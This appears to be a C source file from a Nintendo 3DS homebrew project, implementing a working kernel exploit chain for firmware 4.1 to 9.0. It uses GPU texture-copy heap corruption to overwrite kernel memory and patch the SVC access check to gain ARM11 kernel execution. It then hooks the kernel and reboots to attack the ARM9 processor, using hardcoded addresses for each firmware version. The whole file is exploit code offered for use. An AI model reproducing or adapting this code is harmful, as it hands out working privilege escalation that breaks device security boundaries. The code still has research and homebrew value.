/*
 * Copyright (C) 2015 Aliak <aliakr18@gmail.com>
 * Copyright (C) 2015 173210 <root.3.173210@live.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <3ds.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <inttypes.h>
#include <string.h>
#include <malloc.h>
#include <dirent.h>
#include <errno.h>
#include "arm11.h"

static const int32_t bx_lr = 0xE12FFF1E; // bx lr
static const int32_t nop = 0xE320F000; // nop {0}
static const int32_t ldr_pc_pc_4 = 0xE51FF004; // ldr pc, [pc, #4]

static u32 nopSlide[0x1000] __attribute__((aligned(0x1000)));

static int32_t *createThreadPatchPtr = NULL;
static int32_t *svcPatchPtr = NULL;

static void *sharedPtr = NULL;
static int32_t *arm11Payload = NULL;
static int32_t *hook0 = NULL;
static int32_t *hook1 = NULL;

static int svcIsPatched = 0;

// Uncomment to have progress printed w/ printf
#define DEBUG_PROCESS

static int gshaxCopy(void *dst, void *src, unsigned int len)
{
	void *p;
	int i;

	if (dst == NULL || src == NULL)
		return -1;

	p = linearMemAlign(0x10000, 0x40);
	if (p == NULL)
		return -1;

	// Sometimes I don't know the actual value to check (when copying from unknown memory)
	// so instead of using check_mem/check_off, just loop "enough" times.
	for (i = 0; i < 5; ++i) {
		GSPGPU_FlushDataCache (NULL, src, len);
		GX_SetTextureCopy(NULL, src, 0, dst, 0, len, 8);
		GSPGPU_FlushDataCache (NULL, p, 16);
		GX_SetTextureCopy(NULL, src, 0, p, 0, 0x40, 8);
	}

	linearFree(p);

	return 0;
}

static int getPatchPtr()
{
	int32_t ver;
	u8 isN3DS;

	// Get proper patch address for our kernel -- thanks yifanlu once again
	ver = *(int32_t *)0x1FF80000; // KERNEL_VERSION register
	createThreadPatchPtr = NULL;
	svcPatchPtr = NULL;

	if (ver >= 0x022C0600) {
		APT_CheckNew3DS(NULL, &isN3DS);
		if (isN3DS) {
#ifdef DEBUG_PROCESS
			printf("New 3DS is not supported.\n");
#endif
			return -1;
		}
	}

	switch (ver) {
		case 0x02220000: // 2.34-0 4.1.0
			createThreadPatchPtr = (void *)0xEFF83C97;
			svcPatchPtr = (void *)0xEFF827CC;

			sharedPtr = (void *)0xF0000000;
			arm11Payload = (void *)0xEFFF4C80;
			hook0 = (void *)0xEFFE4DD4;
			hook1 = (void *)0xEFFF497C;

			pxiReg = 0xFFFD2000;
			hook0ret = 0xFFF84DDC;
			hook1ret = 0x1FFF4C84;

			return 0;

		case 0x02230600: // 2.35-6 5.0.0
			createThreadPatchPtr = (void *)0xEFF8372F;
			svcPatchPtr = (void *)0xEFF822A8;

			sharedPtr = (void *)0xF0000000;
			arm11Payload = (void *)0xEFFF4C80;
			hook0 = (void *)0xEFFE55BC;
			hook1 = (void *)0xEFFF4978;

			pxiReg = 0xFFFD2000;
			hook0ret = 0xFFF765C4;
			hook1ret = 0x1FFF4C84;

			return 0;

		case 0x02240000: // 2.36-0 5.1.0
			createThreadPatchPtr = (void *)0xEFF8372B;
			svcPatchPtr = (void *)0xEFF822A4;

			sharedPtr = (void *)0xF0000000;
			arm11Payload = (void *)0xEFFF4C80;
			hook0 = (void *)0xEFFE55B8;
			hook1 = (void *)0xEFFF4978;

			pxiReg = 0xFFFD2000;
			hook0ret = 0xFFF765C0;
			hook1ret = 0x1FFF4C84;

			return 0;

		case 0x02250000: // 2.37-0 6.0.0
		case 0x02260000: // 2.38-0 6.1.0
			createThreadPatchPtr = (void *)0xEFF8372B;
			svcPatchPtr = (void *)0xEFF822A4;

			sharedPtr = (void *)0xF0000000;
			arm11Payload = (void *)0xEFFF4C80;
			hook0 = (void *)0xEFFE5AE8;
			hook1 = (void *)0xEFFF4978;

			pxiReg = 0xFFFD2000;
			hook0ret = 0xFFF76AF0;
			hook1ret = 0x1FFF4C84;

			return 0;

		case 0x02270400: // 2.39-4 7.0.0
			createThreadPatchPtr = (void *)0xEFF8372F;
			svcPatchPtr = (void *)0xEFF822A8;

			sharedPtr = (void *)0xF0000000;
			arm11Payload = (void *)0xEFFF4C80;
			hook0 = (void *)0xEFFE5B34;
			hook1 = (void *)0xEFFF4978;

			pxiReg = 0xFFFD2000;
			hook0ret = 0xFFF76B3C;
			hook1ret = 0x1FFF4C84;

			return 0;

		case 0x02280000: // 2.40-0 7.2.0
			createThreadPatchPtr = (void *)0xEFF8372B;
			svcPatchPtr = (void *)0xEFF822A4;

			sharedPtr = (void *)0xE0000000;
			arm11Payload = (void *)0xDFFF4C80;
			hook0 = (void *)0xEFFE5B30;
			hook1 = (void *)0xEFFF4978;

			pxiReg = 0xFFFD2000;
			hook0ret = 0xFFF76B38;
			hook1ret = 0x1FFF4C84;

			return 0;

		case 0x022C0600: // 2.44-6 8.0.0
			createThreadPatchPtr = (void *)0xDFF83767;
			svcPatchPtr = (void *)0xDFF82294;

			sharedPtr = (void *)0xE0000000;
			arm11Payload = (void *)0xDFFF4C80;
			hook0 = (void *)0xDFFE4F28;
			hook1 = (void *)0xDFFF4974;

			pxiReg = 0xFFFC0000;
			hook0ret = 0xFFF66F30;
			hook1ret = 0x1FFF4C84;

			return 0;

		case 0x022E0000: // 2.26-0 9.0.0
			createThreadPatchPtr = (void *)0xDFF83837;
			svcPatchPtr = (void *)0xDFF82290;

			sharedPtr = (void *)0xE0000000;
			arm11Payload = (void *)0xDFFF4C80;
			hook0 = (void *)0xDFFE59D0;
			hook1 = (void *)0xDFFF4974;

			pxiReg = 0xFFFC4000;
			hook0ret = 0xFFF279D8;
			hook1ret = 0x1FFF4C84;

			return 0;

		default:
#ifdef DEBUG_PROCESS
			printf("Unrecognized kernel version %" PRIx32 ".\n",
				ver);
#endif
			return -1;
		}
}

static int arm11Kxploit()
{
	const size_t allocSize = 0x2000;
	const size_t freeOffset = 0x1000;
	const size_t freeSize = allocSize - freeOffset;
	const size_t bufSize = 0x10000;
	int32_t *buf;
	void *p, *free;
	int32_t saved[8];
	u32 i;

	if (createThreadPatchPtr == NULL)
		return -EFAULT;

	buf = linearMemAlign(bufSize, 0x10000);
	if (buf == NULL)
		return -ENOMEM;

	// Wipe memory for debugging purposes
	for (i = 0; i < sizeof(nopSlide) / sizeof(int32_t); i++)
		buf[i] = 0xDEADBEEF;

	// Part 1: corrupt kernel memory
	svcControlMemory((u32 *)&p, 0, 0, allocSize, MEMOP_ALLOC_LINEAR, 0x3);
	free = (void *)((uintptr_t)p + freeOffset);

	printf("Freeing memory\n");
	svcControlMemory(&i, (u32)free, 0, freeSize, MEMOP_FREE, 0);

	printf("Backing up heap area\n");
	gshaxCopy(buf, free, 0x20);

	memcpy(saved, buf, sizeof(saved));

	buf[0] = 1;
	buf[1] = (uint32_t)createThreadPatchPtr;
	buf[2] = 0;
	buf[3] = 0;

#ifdef DEBUG_PROCESS
	printf("Overwriting free pointer %p\n", p);
#endif

	// Trigger write to kernel
	gshaxCopy(free, buf, 0x10);
	svcControlMemory(&i, (u32)p, 0, freeOffset, MEMOP_FREE, 0);

#ifdef DEBUG_PROCESS
	printf("Triggered kernel write\n");
	gfxFlushBuffers();
	gfxSwapBuffers();
#endif

	memcpy(buf, saved, sizeof(saved));
	printf("Restoring heap\n");
	gshaxCopy(p, buf, 0x20);

	 // Part 2: trick to clear icache
	for (i = 0; i < sizeof(nopSlide) / sizeof(int32_t); i++)
		buf[i] = nop;
	buf[i - 1] = bx_lr;

	gshaxCopy(nopSlide, buf, bufSize);

	HB_FlushInvalidateCache();
	((void (*)())nopSlide)();

#ifdef DEBUG_PROCESS
	printf("Exited nop slide\n");
	gfxFlushBuffers();
	gfxSwapBuffers();
#endif

	getPatchPtr();

	return 0;
}

static inline void synci()
{
	__asm__("mov r0, #0\n"
		"mcr p15, 0, r0, c7, c10, 0\n" // Clean Dcache
		"mcr p15, 0, r0, c7, c5, 0\n" // Invalidate Icache
		::: "r0");
}

static int arm9Exploit()
{
	int (* const reboot)(int, int, int, int) = (void *)0xFFF748C4;
	int32_t *src, *dst;

	__asm__("clrex");

	if (arm11Payload == NULL || hook0 == NULL
		|| arm11PayloadTop == NULL || arm11PayloadBtm == NULL)
		return -EFAULT;

	// ARM9 code copied to FCRAM 0x23F00000
	//memcpy((void *)((uintptr_t)sharedPtr + 0xF3F00000), ARM9_PAYLOAD, ARM9_PAYLOAD_LEN);
	// Write function hooks
	dst = arm11Payload;
	for (src = arm11PayloadTop; src != arm11PayloadBtm; src++) {
		*dst = *src;
		dst++;
	}

	hook0[0] = ldr_pc_pc_4;
	hook0[1] = 0xFFFF0C80; // arm11Payload

	hook1[0] = ldr_pc_pc_4;
	hook1[1] = 0x1FFF4C84; // arm11Payload + 4

	synci();

	return reboot(0, 0, 2, 0);
}

#ifdef DEBUG_PROCESS
static void test()
{
}
#endif

static void __attribute__((naked)) arm11Kexec()
{

	__asm__("add sp, sp, #8\n");

	// Fix up memory
	if (createThreadPatchPtr != NULL)
		createThreadPatchPtr[2] = 0x8DD00CE5;

	// Give us access to all SVCs (including 0x7B, so we can go to kernel mode)
	if (svcPatchPtr != NULL) {
		svcPatchPtr[0] = nop;
		svcPatchPtr[2] = nop;
		svcIsPatched = 1;
	}

	synci();

	arm9Exploit();

	__asm__("movs r0, #0\n"
		 "pop {pc}\n");
}

int exploit()
{
	u32 result;
	int i;

	HB_ReprotectMemory(nopSlide, 4, 7, &result);

	for (i = 0; i < sizeof(nopSlide) / sizeof(int32_t); i++)
		nopSlide[i] = nop;
	nopSlide[i-1] = bx_lr;
	HB_FlushInvalidateCache();

#ifdef DEBUG_PROCESS
	printf("Testing nop slide\n");
#endif

	((void (*)())nopSlide)();

#ifdef DEBUG_PROCESS
	printf("Exited nop slide\n");
#endif

	if (getPatchPtr())
		return -1;
#ifdef DEBUG_PROCESS
	printf("createThread Addr: %p\nSVC Addr: %p\n",
		createThreadPatchPtr, svcPatchPtr);
#endif

	i = arm11Kxploit();
	if (i)
		return i;

#ifdef DEBUG_PROCESS
	printf("Kernel exploit set up, \nExecuting code under ARM11 Kernel...\n");
#endif
	__asm__("ldr r0, =%0\n"
		"svc #8\n"
		:: "i"(arm11Kexec) : "r0");
#ifdef DEBUG_PROCESS
	if (svcIsPatched) {
		printf("Testing SVC 0x7B\n");
		__asm__("ldr r0, =%0\n"
			"svc #0x7B\n"
			:: "i"(test) : "r0");
	}
#endif

	return !svcIsPatched;
}
